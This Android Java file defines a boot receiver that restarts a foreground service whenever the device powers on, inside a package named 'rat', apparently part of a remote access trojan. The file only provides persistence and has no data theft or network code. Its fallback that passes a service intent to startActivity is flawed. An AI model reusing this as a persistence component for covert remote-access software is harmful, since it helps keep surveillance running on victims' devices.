package com.fly0rakoon.rat.services;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.util.Log;

public class BootReceiver extends BroadcastReceiver {
    
    private static final String TAG = "BootReceiver";
    
    @Override
    public void onReceive(Context context, Intent intent) {
        String action = intent.getAction();
        Log.d(TAG, "Received broadcast: " + action);
        
        // Check if this is a boot completed event
        if (Intent.ACTION_BOOT_COMPLETED.equals(action) || 
            Intent.ACTION_REBOOT.equals(action) ||
            "android.intent.action.QUICKBOOT_POWERON".equals(action)) {
            
            Log.d(TAG, "Device boot completed, starting service...");
            
            // Start the foreground service
            startForegroundService(context);
        }
    }
    
    private void startForegroundService(Context context) {
        Intent serviceIntent = new Intent(context, ForegroundService.class);
        
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                // For Android 8.0 and above, use startForegroundService
                context.startForegroundService(serviceIntent);
                Log.d(TAG, "Started foreground service (Android O+)");
            } else {
                // For older versions
                context.startService(serviceIntent);
                Log.d(TAG, "Started service (pre-Android O)");
            }
        } catch (Exception e) {
            Log.e(TAG, "Error starting service after boot: " + e.getMessage());
            
            // Alternative method - try with explicit flags
            try {
                serviceIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                context.startActivity(serviceIntent);
            } catch (Exception ex) {
                Log.e(TAG, "Both methods failed: " + ex.getMessage());
            }
        }
    }
}